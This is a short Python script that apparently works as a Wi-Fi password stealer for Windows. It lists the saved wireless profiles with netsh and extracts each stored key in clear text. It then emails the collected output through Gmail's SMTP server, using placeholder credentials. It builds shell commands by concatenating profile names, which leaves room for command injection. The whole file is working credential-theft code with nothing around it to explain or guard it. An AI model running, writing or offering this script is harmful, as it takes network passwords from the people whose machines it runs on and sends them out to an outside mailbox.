import subprocess
import re
import smtplib


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


cmd1 = "netsh wlan show profile"

network = subprocess.check_output(cmd1, shell=True)

net_n_dmp = re.findall("(?:Profile\s*:\s*)(.*)",network.decode("utf-8"))

result = ""

for net_n in net_n_dmp:
    cmd2 = "netsh wlan show profile name=\"" +net_n+"\" key=\"clear\""
    curr = subprocess.check_output(cmd2,shell=True)
    curr = curr.decode()
    result += curr

send_email("example@example.com", "passEXAMPLE", result)
